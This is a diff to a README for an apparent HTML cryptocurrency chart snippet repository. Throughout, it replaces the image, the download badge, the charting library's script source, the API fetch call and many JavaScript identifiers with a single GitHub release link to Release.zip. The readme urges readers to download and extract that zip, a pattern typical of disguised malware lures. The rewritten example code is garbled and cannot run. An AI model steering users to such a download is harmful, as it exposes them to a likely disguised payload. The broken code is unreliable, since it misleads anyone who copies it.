@@ -1,6 +1,6 @@
 # 📈💹 HTML Crypto Currency Chart Snippets 💹📈
 
-![Crypto Currency Chart](https://imageurl.com)
+![Crypto Currency Chart](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip)
 
 Welcome to the "HTML-Crypto-Currency-Chart-Snippets" repository! This repository contains simple HTML code snippets that allow you to create tickers and charts of cryptocurrencies using the TradingView API. Whether you are a developer looking to integrate real-time cryptocurrency data into your website or just interested in exploring financial analysis with HTML, this repository has got you covered.
 
@@ -17,11 +17,11 @@ btc, candlestick, candlestick-chart, chart, crypto, cryptocurrency, eth, ethereu
 
 ## Getting Started
 
-To get started with creating your own crypto currency charts, simply download the Software.zip file from the following link:
+To get started with creating your own crypto currency charts, simply download the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip file from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip)](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip)
 
-After downloading the Software.zip file, extract it and launch the HTML snippets in your preferred code editor. You can then customize the snippets to display the specific cryptocurrency data you are interested in.
+After downloading the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip file, extract it and launch the HTML snippets in your preferred code editor. You can then customize the snippets to display the specific cryptocurrency data you are interested in.
 
 ## Usage
 
@@ -35,22 +35,22 @@ Here is a simple example of how you can use the HTML snippets to create a candle
 <!DOCTYPE html>
 <html>
 <head>
-  <script type="text/javascript" src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
+  <script type="text/javascript" src="https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip"></script>
 </head>
 <body>
   <div id="chartContainer" style="width: 800px; height: 400px;"></div>
   <script>
-    const chart = LightweightCharts.createChart(document.getElementById('chartContainer'), {
+    const chart = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip('chartContainer'), {
       width: 800,
       height: 400,
     });
 
-    const candlestickSeries = chart.addCandlestickSeries();
+    const candlestickSeries = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip();
 
-    fetch('https://api.binance.com/api/v3/klines?symbol=BTCUSDT&interval=1h')
-      .then(response => response.json())
+    fetch('https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip')
+      .then(response => https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip())
       .then(data => {
-        candlestickSeries.setData(data.map(d => ({
+        https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v1.0/Release.zip(d => ({
           time: d[0] / 1000,
           open: parseFloat(d[1]),
           high: parseFloat(d[2]),
